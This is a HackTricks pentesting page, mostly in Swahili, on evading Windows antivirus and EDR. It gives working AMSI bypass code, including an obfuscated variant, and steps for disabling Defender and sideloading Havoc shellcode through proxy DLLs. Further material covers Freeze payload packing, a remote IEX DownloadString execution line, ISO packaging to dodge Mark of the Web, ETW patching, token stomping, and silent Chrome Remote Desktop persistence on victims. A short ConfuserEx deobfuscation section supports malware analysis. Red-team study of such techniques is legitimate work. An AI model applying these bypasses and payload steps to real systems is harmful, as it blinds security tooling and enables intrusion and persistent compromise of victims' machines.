# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Kuzima Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kuzima Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kuzima Windows Defender kwa kudanganya AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Kwa sasa, AVs hutumia mbinu tofauti za kukagua kama faili ni hatari au la: static detection, dynamic analysis, na kwa EDR zilizo juu zaidi, behavioural analysis.

### **Static detection**

Ugunduzi wa static hufanyika kwa kuweka alama nyaya zinazoeleweka au safu za bytes ndani ya binary au script, na pia kwa kutoa taarifa kutoka kwa faili yenyewe (mfano: maelezo ya faili, jina la kampuni, digital signatures, ikoni, checksum, n.k.). Hii inamaanisha kwamba kutumia zana za umma zinazojulikana kunaweza kukufanya uonekane haraka zaidi, kwani huenda zimechunguzwa na kuwekwa alama kama hatari. Kuna njia kadhaa za kuepuka aina hii ya ugunduzi:

- **Encryption**

Ikiwa utachoma binary, hakuna njia kwa AV kugundua programu yako, lakini utahitaji aina fulani ya loader ili kuifungua na kuendesha programu hiyo kwa memory.

- **Obfuscation**

Wakati mwingine yote unayohitaji ni kubadilisha baadhi ya strings katika binary au script yako ili ipite kwa AV, lakini hii inaweza kuwa kazi inayoendelea kulingana na unachojaribu kuficha.

- **Custom tooling**

Ikiwa utatengeneza zana zako mwenyewe, hakuna signatures zinazojulikana za uharibifu, lakini hii inachukua muda mwingi na juhudi.

> [!TIP]
> Njia nzuri ya kukagua dhidi ya static detection ya Windows Defender ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Inagawa faili katika vipande vingi kisha inaagiza Defender iskanie kila kipande kivyake; kwa njia hii inaweza kukuonyesha hasa ni strings au bytes gani zilizowekwa alama katika binary yako.

Ninapendekeza uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.

### **Dynamic analysis**

Dynamic analysis ni pale ambapo AV inaendesha binary yako katika sandbox na inatazama shughuli hatarishi (mfano: kujaribu kuifungua na kusoma nywila za kivinjari, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo unaweza kufanya ili kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi ilivyotekelezwa, inaweza kuwa njia nzuri ya kuipita dynamic analysis ya AV. AVs zina muda mfupi mno wa kuchunguza faili ili zisuvie mtiririko wa kazi wa mtumiaji, hivyo kutumia sleep ndefu kunaweza kuingilia uchambuzi wa binaries. Tatizo ni kwamba sandboxes za AV nyingi zinaweza kuruka sleep kulingana na jinsi ilivyotekelezwa.
- **Checking machine's resources** Kawaida Sandboxes zina rasilimali chache (mfano: < 2GB RAM), vinginevyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kuwa mbunifu hapa, kwa mfano kwa kukagua joto la CPU au hata kasi za fan; si kila kitu kitatekelezwa ndani ya sandbox.
- **Machine-specific checks** Ikiwa unataka kumlenga mtumiaji ambaye workstation yake imejiunga na domain "contoso.local", unaweza kufanya ukaguzi wa domain ya kompyuta kuona kama inalingana na ule ulioweka; ikiwa haifanani, unaweza kufanya programu yako itoke.

Inajulikana kwamba Sandbox ya Microsoft Defender ina computername HAL9TH, hivyo unaweza kukagua jina la kompyuta katika malware yako kabla ya detonation; ikiwa jina linaendana na HAL9TH, ina maana uko ndani ya sandbox ya defender, hivyo unaweza kufanya programu yako itohe.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Mishauri mingine mizuri kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kwa kupigana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali, **public tools** hatimaye zitakuwa **zimegunduliwa**, hivyo unapaswa kujitathmini:

Kwa mfano, ikiwa unataka dump LSASS, **je, unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi tofauti usiojulikana sana ambao pia unadump LSASS.

Jibu sahihi pengine ni hili la mwisho. Kwa mfano mimikatz ni moja ya, kama sio zaidi, vipande vya programu vinavyowekwa alama na AVs na EDRs, mradi huo ni mzuri sana, lakini pia ni kichawi kujaribu kuzunguka AVs ukitumia, hivyo tafuta mbadala kwa kile unachotaka kufanikisha.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha kuwa **imezimwa automatic sample submission** katika Defender, na tafadhali, kwa uzito, **USIPANUA KWA VIRUSTOTAL** ikiwa lengo lako ni kufikia evasion kwa muda mrefu. Ikiwa unataka kukagua kama payload yako inagunduliwa na AV fulani, isnstall AV hiyo kwenye VM, jaribu kuzima automatic sample submission, na ujaribu huko hadi uridhike na matokeo.

## EXEs vs DLLs

Pale inapowezekana, kila mara **pendelea kutumia DLLs kwa ajili ya evasion**, kwa uzoefu wangu, faili za DLL kwa kawaida huwa **zinagunduliwa kidogo zaidi** na kuchambuliwa, hivyo ni trick rahisi kutumia ili kuepuka ugunduzi katika baadhi ya kesi (ikiwa payload yako ina njia ya kuendeshwa kama DLL bila shaka).

Kama tunaona katika picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha tricks unaweza kutumia na faili za DLL ili uwe mfnye zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inatumia search order ya DLL inayotumiwa na loader kwa kuweka programu ya mgeni na payload(s) ya uharibifu kando kwa kando.

Unaweza kukagua programu zinazoweza kuathirika na DLL Sideloading kutumia [Siofra](https://github.com/Cybereason/siofra) na script ya powershell ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana ufanye mwenyewe **explore DLL Hijackable/Sideloadable programs yourself**, mbinu hii ni ya kimya kabisa inapofanywa vizuri, lakini ukitumia programu za umma zinazojulikana za DLL Sideloadable, unaweza kukamatwa kwa urahisi.

Kwa kuweka tu malicious DLL yenye jina ambalo programu inatarajia kupakia, haitapakia payload yako, kwa sababu programu inatarajia baadhi ya functions maalum ndani ya DLL hiyo; ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** husafirisha miito ambayo programu inafanya kutoka kwa proxy (na malicious) DLL kwenda kwa DLL ya asili, hivyo ikihifadhi utendaji wa programu na kuwezesha kushughulikia utekelezwaji wa payload yako.

Nitakuwa nikitumia mradi [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo wa chanzo cha DLL, na DLL ya asili iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Kila shellcode yetu (imekodishwa na [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina kiwango cha kugundua 0/26 kwenye [antiscan.me](https://antiscan.me)! Ningeita hiyo mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza **kwa nguvu** uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu tulichojadili kwa undani.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Kuepuka kugunduliwa ni mchezo wa paka na panya; kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee zana moja tu; endapo inawezekana, jaribu kuunganisha mbinu kadhaa za kuepuka kugunduliwa.

## AMSI (Anti-Malware Scan Interface)

AMSI ilaundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzoni, AV zilikuwa zinaweza tu kutazama **files on disk**, hivyo ikiwa ungeweza kutekeleza payloads **directly in-memory**, AV haingeweza kufanya chochote kuzuia, kwa sababu haikuwa na uwezo wa kuona vya kutosha.

Sehemu ya AMSI imeingizwa ndani ya vipengele hivi vya Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Inaruhusu suluhisho za antivirus kuchambua tabia za script kwa kufichua yaliyomo ya script katika fomati isiyo encrypted na isiyofichwa.

Kukimbisha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutaonekana kutoa onyo lifuatalo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi linavyoanza na `amsi:` na kisha njia ya executable ambayo script ilikimbizwa kutoka, katika kesi hii, powershell.exe

Hatukuweka faili yoyote kwenye disk, lakini bado tulikamatwa in-memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia .NET 4.8, C# code pia inapatikana kupitia AMSI. Hii hata inaathiri `Assembly.Load(byte[])` kwa load in-memory execution. Ndiyo sababu inashauriwa kutumia matoleo ya chini ya .NET (kama 4.7.2 au chini) kwa execution in-memory ikiwa unataka kuepuka AMSI.

Kuna njia kadhaa za kuzunguka AMSI:

- **Obfuscation**

Kwa kuwa AMSI kwa ujumla hufanya kazi kwa detections za static, hivyo, kubadilisha scripts unazojaribu kuzipakia inaweza kuwa njia nzuri ya kuepuka detection.

Hata hivyo, AMSI ina uwezo wa kuondoa obfuscation hata kama kuna safu nyingi, hivyo obfuscation inaweza kuwa chaguo mbaya kulingana na jinsi inavyofanywa. Hii inafanya iwe si rahisi kuepuka. Ingawa, wakati mwingine, yote unayohitaji kufanya ni kubadilisha couple ya variable names na utakuwa sawa, hivyo inategemea ni kiasi gani kitu kimeonekana kuwa hatari.

- **AMSI Bypass**

Kwa kuwa AMSI imefanywa kwa kupakia DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuibadilisha kwa urahisi hata ukiwa kama mtumiaji asiye na mamlaka (unprivileged). Kutokana na kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kuepuka AMSI scanning.

**Forcing an Error**

Kusababisha AMSI initialization kushindwa (amsiInitFailed) kutasababisha hakuna scan itakayozinduliwa kwa mchakato wa sasa. Hii awali ilifichuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda signature ili kuzuia matumizi mapana.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua tu mstari mmoja wa msimbo wa powershell kufanya AMSI isiweze kutumika kwa mchakato wa powershell wa sasa. Mstari huu, bila shaka, umewekwa alama na AMSI yenyewe, hivyo marekebisho fulani yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyopata kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka, hili labda litawekwa alama mara chapisho hili litakapotangazwa, hivyo usichapishe msimbo ikiwa unakusudia kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kupata anwani ya kazi "AmsiScanBuffer" katika amsi.dll (inayehusika na kuchunguza ingizo lililotolewa na mtumiaji) na kuibadilisha kwa maagizo ya kurudisha msimbo wa E_INVALIDARG; kwa njia hii, matokeo ya skanu halisi yatarudisha 0, jambo linalotafsiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Kuna mbinu nyingi nyingine pia zinazotumiwa kupita AMSI kwa PowerShell, angalia [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) kujifunza zaidi kuhusu hizo.

Zana hii [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) pia inazalisha script za kupitisha AMSI.

**Remove the detected signature**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyotambuliwa kutoka kwenye kumbukumbu ya mchakato wa sasa. Zana hizi zinafanya kazi kwa kuchambua kumbukumbu ya mchakato wa sasa kwa ajili ya saini ya AMSI kisha kuandika juu yake maagizo ya NOP, kwa ufanisi kuiondoa kwenye kumbukumbu.

**AV/EDR products that uses AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell toleo 2**
Iwapo utatumia PowerShell toleo 2, AMSI haitapakiwa, hivyo unaweza kuendesha script zako bila kukaguliwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## Uandishi wa PowerShell

PowerShell logging ni kipengele kinachokuruhusu kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hili linaweza kuwa muhimu kwa ukaguzi na utatuzi wa matatizo, lakini pia linaweza kuwa tatizo kwa washambulizi wanaotaka kuepuka kugunduliwa.

Ili kuvuka PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa ajili ya hili.
- **Tumia PowerShell version 2**: Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha skiripti zako bila kuchunguzwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha PowerShell bila kinga (hivi ndicho `powerpick` kutoka Cobal Strike hutumia).


## Kufichaji

> [!TIP]
> Mbinu kadhaa za kuficha zinategemea kusimbua data, jambo ambalo litaongeza entropy ya binary na kufanya iwe rahisi kwa AVs na EDRs kuigundua. Kuwa makini na hili na labda tumia usimbaji tu kwa sehemu maalum za msimbo wako ambazo ni nyeti au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wakati wa kuchambua malware inayotumia ConfuserEx 2 (au forks za kibiashara) ni kawaida kukabiliana na tabaka kadhaa za ulinzi zitakazozuia decompilers na sandboxes. Mtiririko wa kazi ufuatao unarejesha kwa uhakika **karibu IL asili** ambayo baadaye inaweza ku-decompile kuwa C# kwa zana kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  Hii pia inapatch checksum ya PE kwa hivyo mabadiliko yoyote yatakata binary. Tumia **AntiTamperKiller** kutambua encrypted metadata tables, kupata XOR keys na kuandika upya assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output ina parameters 6 za anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambazo zinaweza kuwa muhimu wakati wa kujenga unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot itafuta control-flow flattening, kurejesha namespaces, classes na variable names za awali na kusimbua (decrypt) constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Ondoa hizi kwa **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii unapaswa kuona APIs za kawaida za .NET kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper functions zenye ghide (`Class8.smethod_10`, …).

4.  Manual clean-up – endesha binary iliyopatikana chini ya dnSpy, tafuta blobs kubwa za Base64 au kutumia `RijndaelManaged`/`TripleDESCryptoServiceProvider` kutambua payload halisi. Mara nyingi malware inahifadhi kama TLV-encoded byte array iliyoanzishwa ndani ya `<Module>.byte_0`.

Mnyororo ulio hapo juu unarejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sampuli hatari – inafaa kufanya kazi kwenye workstation isiyounganishwa.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### Mstari mmoja
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya chanzo wazi ya [LLVM] compilation suite inayoweza kutoa usalama wa programu ulioimarishwa kupitia [code obfuscation] na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` ili kuzalisha, wakati wa compilation, msimbo uliokatwa bila kutumia zana za nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Inaongeza safu ya operesheni zilizofichwa zinazozalishwa na C++ template metaprogramming framework ambazo zitamfanya mtu anayetaka kuvunja programu kuwa na kazi ngumu zaidi.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za pe files zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni metamorphic code engine rahisi kwa executables yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa lugha zinazotungwa na LLVM kwa kutumia ROP (return-oriented programming). ROPfuscator huficha programu kwa ngazi ya assembly code kwa kubadilisha maagizo ya kawaida kuwa ROP chains, ikizuia mtazamo wetu wa kawaida wa control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter imeandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode kisha kuzipakia

## SmartScreen & MoTW

Huenda umeona skrini hii ukiwa unapakua baadhi ya executables kutoka kwenye intaneti na kuzifanya ziendeshwe.

Microsoft Defender SmartScreen ni utaratibu wa usalama uliolenga kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications ambazo zinaweza kuwa zenye madhara.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen inafanya kazi zaidi kwa njia ya msingi wa sifa (reputation-based approach), ikimaanisha kwamba applications zisizo za kawaida kupakuliwa zitatuma alama kwa SmartScreen hivyo kuonya na kuzuia mtumiaji wa mwisho kuendesha faili (ingawa faili bado zinaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina la Zone.Identifier ambayo huundwa moja kwa moja wakati wa kupakua faili kutoka kwenye intaneti, pamoja na URL ambayo ilipakuliwa kutoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Ukaguzi wa Zone.Identifier ADS kwa faili iliyopakuliwa kutoka kwenye intaneti.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kuwa executables zilizotiwa sahihi na cheti cha kusaini cha **trusted** hazitachochea SmartScreen.

Njia yenye ufanisi sana ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **hawezi** kutumika kwenye volumes zisizo za **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayopakia payloads ndani ya output containers ili kuruka Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mfumo wenye nguvu wa logging kwenye Windows ambao unaruhusu applications na system components **kurekodi matukio**. Hata hivyo, pia inaweza kutumika na security products kufuatilia na kugundua shughuli za kibaya.

Kama AMSI inavyoweza kuzimwa (bypassed), pia inawezekana kufanya function ya user space process **`EtwEventWrite`** irudishe mara moja bila kurekodi matukio yoyote. Hii hufanywa kwa ku-patch function hiyo katika memory ili irudishe mara moja, kwa ufanisi kuzima ETW logging kwa process hiyo.

Unaweza kupata taarifa zaidi kwenye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ku-load binaries za C# kwenye memory kumejulikana kwa muda mrefu na bado ni njia nzuri kwa kuendesha post-exploitation tools bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja ndani ya memory bila kugusa disk, tutalazimika tu kuwa na wasiwasi kuhusu ku-patch AMSI kwa process nzima.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari zinatoa uwezo wa kutekeleza C# assemblies moja kwa moja ndani ya memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuzalisha process mpya ya dhabihu**, ku-inject code yako ya post-exploitation kwenye process hiyo mpya, kutekeleza code yako ya kibaya na baada ya kumaliza, kuua process mpya. Hii ina faida zake na hasara zake. Faida ya method ya fork and run ni kwamba utekelezaji unafanyika **nje** ya Beacon implant process yetu. Hii inamaanisha kwamba kama jambo fulani katika vitendo vyetu vya post-exploitation litashindikana au kugunduliwa, kuna **nafuu kubwa zaidi** ya **implant yetu kuishi.** Hasara ni kwamba una **mazingira makubwa** ya kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ni kuhusu ku-inject code ya post-exploitation ya kibaya **ndani ya process yake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuifanya iseshewe na AV, lakini hasara ni kwamba ikiwa kitu kitashindikana na utekelezaji wa payload, kuna **nafuu kubwa zaidi** ya **kupoteza beacon** kwani inaweza ku-crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu ku-load C# Assembly, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia ku-load C# Assemblies **from PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na video ya [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza code ya kibaya kwa kutumia lugha nyingine kwa kumpa mashine iliyodukuliwa ufikiaji **kwa interpreter environment iliyowekwa kwenye Attacker Controlled SMB share**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na environment kwenye SMB share unaweza **kutekeleza code yoyote katika lugha hizi ndani ya memory** ya mashine iliyodukuliwa.

Repo inataja: Defender bado inascans scripts lakini kwa kutumia Go, Java, PHP n.k. tunapata **uwezo zaidi wa kuepuka static signatures**. Mtihani na reverse shell scripts za nasibu zisizo-obfuscated katika lugha hizi umeonyesha mafanikio.

## TokenStomping

Token stomping ni teknik ambayo inawawezesha attacker **kuchezea access token au product ya usalama kama EDR au AV**, kuwawezesha kupunguza privileges zake ili process isife lakini isiwe na ruhusa za kukagua shughuli za kibaya.

Ili kuzuia hili Windows inaweza **kuzuia processes za nje** kupata handles za tokens za processes za usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu ku-deploy Chrome Remote Desktop kwenye PC ya kushambuliwa kisha kuitumia kumiliki na kudumisha persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

